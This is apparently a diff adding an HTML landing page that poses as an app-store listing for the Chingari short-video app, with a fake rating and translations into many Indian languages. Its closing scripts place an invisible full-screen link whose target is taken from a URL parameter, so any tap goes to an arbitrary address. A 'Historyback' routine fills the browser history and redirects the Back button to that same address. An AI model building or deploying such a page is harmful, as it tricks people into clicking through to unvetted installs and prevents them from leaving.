@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="style.css">
+    <title id="a1">A new app is available! </title>
+    <script src="js/jquery-3.3.1.min.js"></script>
+    <script type="text/javascript">
+        function getURLParameter(name) {
+            return decodeURIComponent(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+</head>
+
+<body onload="translate()" class="en ltr">
+    <div class="wrap white-theme">
+        <header>
+            <div class="content">
+                <img class="header__logo" src="img/0389133681937.png">
+
+                <div class="information">
+                    <div class="name text_block" id="a2">
+                        Chingari - Original Indian Short Video App </div>
+                    <div class="vendor">
+                    </div>
+                    <div class="rating">
+                        <img src="img/stars.png">
+                        <span class="value">(957,516)</span>
+                    </div>
+                    <div class="status-button text_block" id="a3">
+                        Free </div>
+                </div>
+            </div>
+        </header>
+        <main>
+            <div class="content">
+                <div class="name">
+                </div>
+                <div class="description ">
+                    <div class="text_block" id="a4">Chingari is No.1 Short Video App - Made in India - Social App.</div>
+                    <div class="text_block" id="a5">☆Registration is free☆</div>
+                </div>
+            </div>
+
+            <div class="image-list js_carousel">
+                <div class="image-list-inner js_carousel-inner" style="width: 2530px; opacity: 1; transition-duration: 0ms; transform: translate3d(-1266px, 0px, 0px);">
+                    <div class="item" data-slide-index="0">
+
+                        <img src="img/1.jpg"></div>
+                    <div class="item" data-slide-index="1">
+
+                        <img src="img/2.jpg"></div>
+                    <div class="item" data-slide-index="2">
+
+                        <img src="img/3.jpg"></div>
+                    <div class="item" data-slide-index="3">
+
+                        <img src="img/4.jpg"></div>
+                    <div class="item" data-slide-index="4">
+
+                        <img src="img/5.jpg"></div>
+                    <div class="item cloned" data-slide-index="0">
+                        <img src="img/1.jpg">
+                    </div>
+                    <div class="item cloned" data-slide-index="1">
+                        <img src="img/2.jpg">
+                    </div>
+                    <div class="item cloned" data-slide-index="2">
+                        <img src="img/3.jpg">
+                    </div>
+                    <div class="item cloned" data-slide-index="3">
+                        <img src="img/4.jpg">
+                    </div>
+                    <div class="item cloned" data-slide-index="4">
+                        <img src="img/5.jpg">
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer>
+            <div class="market-place">
+                <img src="img/dark-android.svg">
+                <img src="img/appl.png">
+            </div>
+            <a class="button transparent finlink text_block" id="a6" href="#">
+                Install </a>
+        </footer>
+    </div>
+
+
+    <script type="text/javascript">
+        (function() {
+                var carouselObj = function() {
+                    var RTL_DIRECTION = false;
+                    if (document.querySelector('body').classList.contains('rtl') || document.querySelector('.wrap')
+                        .classList.contains('rtl')) {
+                        RTL_DIRECTION = true;
+                    }
+
+                    var prefix = (function() {
+                        var styles = window.getComputedStyle(document.documentElement, ''),
+                            pre = (Array.prototype.slice
+                                .call(styles)
+                                .join('')
+                                .match(/-(moz|webkit|ms)-/) || (styles.OLink === '' && ['', 'o'])
+                            )[1],
+                            dom = ('WebKit|Moz|MS|O').match(new RegExp('(' + pre + ')', 'i'))[1];
+                        return {
+                            dom: dom,
+                            lowercase: pre,
+                            css: '-' + pre + '-',
+                            js: pre[0].toUpperCase() + pre.substr(1)
+                        };
+                    })();
+
+                    var carousel = document.querySelector('.js_carousel'),
+                        carouselInner = carousel.querySelector('.js_carousel-inner'),
+                        // slides = carousel.querySelectorAll('*[data-slide-index]'),
+                        carouselItems = carouselInner.querySelectorAll('.item'),
+                        totalTranslate = 0,
+                        totalWidth = 0,
+                        delay = 2000,
+                        transitionDuration = 500;
+
+                    carouselItems = Array.prototype.slice.call(carouselItems);
+                    carouselItems.forEach(function(el, i) {
+                        var cloneEl = el.cloneNode(true);
+
+                        cloneEl.classList.add('cloned');
+
+                        carouselInner.appendChild(cloneEl);
+
+                        var image = el.querySelector('img');
+
+                        var newImage = document.createElement('img');
+
+                        newImage.src = image.src;
+
+                        el.removeChild(image);
+
+                        newImage.onload = function() {
+                            el.appendChild(newImage);
+                            setTimeout(function() {
+                                totalWidth += (newImage.offsetWidth + parseFloat(window
+                                    .getComputedStyle(el).marginRight)) * 2;
+                                if (i != carouselItems.length - 1) return;
+                                setWrapperWidth(totalWidth);
+                            }, 100);
+
+                        }
+                    });
+
+                    function setWrapperWidth(elWidth) {
+
+                        carouselInner.style.width = totalWidth + 'px';
+
+                        carouselInner.style.opacity = 1;
+
+                    }
+
+
+                    function translator(offset, nonanimate) {
+                        if (nonanimate) {
+                            carouselInner.style[prefix.js + "Transform"] = "translate3d(" + (RTL_DIRECTION ? '' :
+                                '-') + offset + "px,0,0)";
+                            return;
+                        }
+
+                        carouselInner.style[prefix.js + "TransitionDuration"] = transitionDuration + "ms";
+                        carouselInner.style[prefix.js + "Transform"] = "translate3d(" + (RTL_DIRECTION ? '' : '-') +
+                            offset + "px,0,0)";
+                        setTimeout(function() {
+                            carouselInner.style[prefix.js + "TransitionDuration"] = "0ms";
+                        }, transitionDuration);
+                    }
+
+                    var temp = 0;
+
+
+                    var interval = setTimeout(function slide() {
+
+                        var current = carouselItems[temp];
+
+                        if (temp == carouselItems.length) {
+                            totalTranslate = 0;
+                            temp = 0;
+                            translator(0, true);
+                            setTimeout(slide, 0);
+                            return;
+                        }
+
+                        totalTranslate += current.offsetWidth + parseFloat(window.getComputedStyle(current)
+                            .marginRight);
+                        translator(totalTranslate);
+                        ++temp;
+                        setTimeout(slide, delay);
+
+                    }, delay);
+
+                };
+                carouselObj()
+            }
+
+
+
+        )();
+    </script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURIComponent(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+
+        var translation = {
+            source: {
+                a1: "A new app is available! ",
+                a2: ` Chingari - Original Indian Short Video App `,
+                a3: `Free`,
+                a4: `Chingari is No.1 Short Video App - Made in India - Social App.`,
+                a5: `☆Registration is free☆`,
+                a6: `Install`,
+
+            },
+            en: {
+                a1: "A new app is available! ",
+                a2: ` Chingari - Original Indian Short Video App `,
+                a3: `Free`,
+                a4: `Chingari is No.1 Short Video App - Made in India - Social App.`,
+                a5: `☆Registration is free☆`,
+                a6: `Install`,
+
+            },
+            hi: {
+                a1: "एक नया ऐप उपलब्ध है!",
+                a2: `चिंगारी - मूल भारतीय लघु वीडियो ऐप`,
+                a3: `नि: शुल्क`,
+                a4: `चिंगारी नंबर 1 शॉर्ट वीडियो ऐप है - मेड इन इंडिया - सोशल ऐप।`,
+                a5: `☆पंजीकरण मुफ्त है☆`,
+                a6: `इंस्टॉल`,
+            },
+
+
+            mr: {
+                a1: `एक नवीन अॅप उपलब्ध आहे!`,
+                a2: `चिंगारी - मूळ भारतीय लघु व्हिडिओ अॅप`,
+                a3: `मोफत`,
+                a4: `चिंगारी नंबर 1 लघु व्हिडिओ अॅप आहे - मेड इन इंडिया - सोशल अॅप. `,
+                a5: `free नोंदणी मोफत आहे ☆`,
+                a6: `स्थापित करा `,
+
+            },
+
+            ta: {
+                a1: "ஒரு புதிய பயன்பாடு கிடைக்கிறது!",
+                a2: `சிங்காரி - அசல் இந்திய குறும்பட வீடியோ ஆப்`,
+                a3: `இலவசம்`,
+                a4: `சிங்காரி என்பது நம்பர் 1 குறுகிய வீடியோ ஆப் - இந்தியாவில் தயாரிக்கப்பட்டது - சமூக பயன்பாடு.`,
+                a5: `☆ பதிவு இலவசம் ☆`,
+                a6: `நிறுவு`,
+            },
+
+            gu: {
+                a1: "એક નવી એપ્લિકેશન ઉપલબ્ધ છે!",
+                a2: `ચિંગારી - મૂળ ભારતીય ટૂંકી વિડિઓ એપ`,
+                a3: `મફત `,
+                a4: `ચિંગારી નંબર 1 શોર્ટ વિડીયો એપ - મેડ ઇન ઇન્ડિયા - સોશિયલ એપ. `,
+                a5: `☆ નોંધણી મફત છે ☆`,
+                a6: `સ્થાપિત કરો `,
+
+            },
+
+            kn: {
+                a1: "ಹೊಸ ಆಪ್ ಲಭ್ಯವಿದೆ!",
+                a2: `ಚಿಂಗಾರಿ - ಮೂಲ ಭಾರತೀಯ ಕಿರು ವೀಡಿಯೋ ಅಪ್ಲಿಕೇಶನ್ `,
+                a3: `ಉಚಿತ`,
+                a4: `ಚಿಂಗಾರಿ ನಂ .1 ಕಿರು ವೀಡಿಯೋ ಆಪ್ - ಭಾರತದಲ್ಲಿ ತಯಾರಿಸಲಾಗಿದೆ - ಸಾಮಾಜಿಕ ಆಪ್ .`,
+                a5: "istration ನೋಂದಣಿ ಉಚಿತ ☆",
+                a6: `ಸ್ಥಾಪಿಸು`,
+
+            },
+            te: {
+                a1: "కొత్త యాప్ అందుబాటులో ఉంది!",
+                a2: `చింగారి - ఒరిజినల్ ఇండియన్ షార్ట్ వీడియో యాప్`,
+                a3: `ఉచితం`,
+                a4: `చింగారి నెం .1 షార్ట్ వీడియో యాప్ - మేడ్ ఇన్ ఇండియా - సోషల్ యాప్.`,
+                a5: "☆ నమోదు ఉచితం ☆",
+                a6: `ఇన్‌స్టాల్ `,
+            },
+            bn: {
+                a1: "একটি নতুন অ্যাপ উপলব্ধ!",
+                a2: `চিংড়ি - মূল ভারতীয় সংক্ষিপ্ত ভিডিও অ্যাপ`,
+                a3: `ফ্রি`,
+                a4: `চিংড়ি হল 1 নম্বর ছোট ভিডিও অ্যাপ - মেড ইন ইন্ডিয়া - সোশ্যাল অ্যাপ। `,
+                a5: `☆ নিবন্ধন বিনামূল্যে ☆`,
+                a6: 'ইনস্টল',
+            },
+            ur: {
+                a1: "ایک نئی ایپ دستیاب ہے! ",
+                a2: `چنگاری - اصل انڈین شارٹ ویڈیو ایپ۔ `,
+                a3: `مفت۔`,
+                a4: `چنگاری نمبر 1 شارٹ ویڈیو ایپ ہے - میڈ ان انڈیا - سوشل ایپ۔`,
+                a5: `☆رجسٹریشن مفت ہے۔☆`,
+                a6: `انسٹال کریں۔`,
+            },
+            ml: {
+                a1: "ഒരു പുതിയ ആപ്പ് ലഭ്യമാണ്!",
+                a2: `ചിങ്ങാരി - യഥാർത്ഥ ഇന്ത്യൻ ഷോർട്ട് വീഡിയോ ആപ്പ് `,
+                a3: `സൗജന്യ`,
+                a4: `ചിങ്ങാരി ആണ് നമ്പർ 1 ഷോർട്ട് വീഡിയോ ആപ്പ് - ഇന്ത്യയിൽ നിർമ്മിച്ചത് - സോഷ്യൽ ആപ്പ് .`,
+                a5: "☆ രജിസ്ട്രേഷൻ സൗജന്യമാണ്",
+                a6: 'ഇൻസ്റ്റാൾ ചെയ്യുക',
+            },
+            or: {
+                a1: "ଏକ ନୂତନ ଆପ୍ ଉପଲବ୍ଧ!",
+                a2: "ଚିଙ୍ଗାରି - ମୂଳ ଭାରତୀୟ କ୍ଷୁଦ୍ର ଭିଡିଓ ଆପ୍",
+                a3: "ମାଗଣା",
+                a4: "ଚିଙ୍ଗାରି ହେଉଛି ନଂ 1 ସର୍ଟ ଭିଡିଓ ଆପ୍ - ମେଡ୍ ଇନ୍ ଇଣ୍ଡିଆ - ସୋସିଆଲ୍ ଆପ୍ |",
+                a5: `☆ ପଞ୍ଜୀକରଣ ମାଗଣା ☆`,
+                a6: "ସଂସ୍ଥାପନ",
+            },
+            pa: {
+                a1: "ਇੱਕ ਨਵਾਂ ਐਪ ਉਪਲਬਧ ਹੈ!",
+                a2: `ਚਿੰਗਾਰੀ - ਮੂਲ ਭਾਰਤੀ ਛੋਟਾ ਵੀਡੀਓ ਐਪ`,
+                a3: `ਮੁਫਤ`,
+                a4: `ਚਿੰਗਾਰੀ ਨੰਬਰ 1 ਲਘੂ ਵੀਡੀਓ ਐਪ ਹੈ - ਮੇਡ ਇਨ ਇੰਡੀਆ - ਸੋਸ਼ਲ ਐਪ।`,
+                a5: `☆ ਰਜਿਸਟ੍ਰੇਸ਼ਨ ਮੁਫਤ ਹੈ ☆`,
+                a6: `ਇੰਸਟਾਲ`,
+            },
+        };
+
+        function replace_text(lang, text) {
+            x = document.getElementById(text);
+            if (x) {
+                x.innerHTML = translation[lang][text];
+            } else {
+                console.log("element not Found: " + text);
+            }
+        }
+
+        function alert_string(lang, text) {
+            return translation[lang][text] + "\n\n";
+        }
+
+        function translation_available(lang) {
+            if (translation[lang]) {
+                return lang;
+            } else {
+                console.log("translation not Found: " + lang);
+                return "source";
+            }
+        }
+
+        function detect_language() {
+            var detected_language = navigator.language;
+            if (detected_language.length > 2) {
+                detected_language = detected_language[0] + detected_language[1];
+            };
+
+            if (jQuery.inArray(detected_language, ['ar', 'he', 'fa', 'ur']) >= 0) {
+                $('html').attr('DIR', 'RTL');
+                $('.rtl').css('text-align', 'right');
+            }
+            return translation_available(detected_language);
+        }
+
+        function translate() {
+            var detected_language = detect_language();
+            for (y in translation["source"]) {
+                replace_text(detected_language, y);
+                if (y == 'aler') {
+                    strAlert += translation[detected_language][y];
+                }
+            }
+
+        }
+
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+    <a id="noreferrer noopener " class="finlink" href="" style="position: fixed; left: 0; top: 0; right: 0; bottom: 0; display: block; z-index: 99999; "></a>
+
+    <script type="text/javascript">
+        var fin_link = decodeURIComponent(getURLParameter('p1'));
+        var links = document.getElementsByClassName('finlink');
+        for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+
+        for (var j = 0; j < links.length; j++) {
+            links[j].addEventListener('click', function() {
+                window.onbeforeunload = null;
+            });
+        }
+
+        function getURLParameter(name) {
+            return decodeURIComponent(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+
+        //Historyback
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+                onpopstate = function(t) {
+                    window.onbeforeunload = null;
+                    t.state && location.replace(fin_link);
+                };
+            } catch (o) {}
+        }();
+    </script>
+</body>
+
+</html>
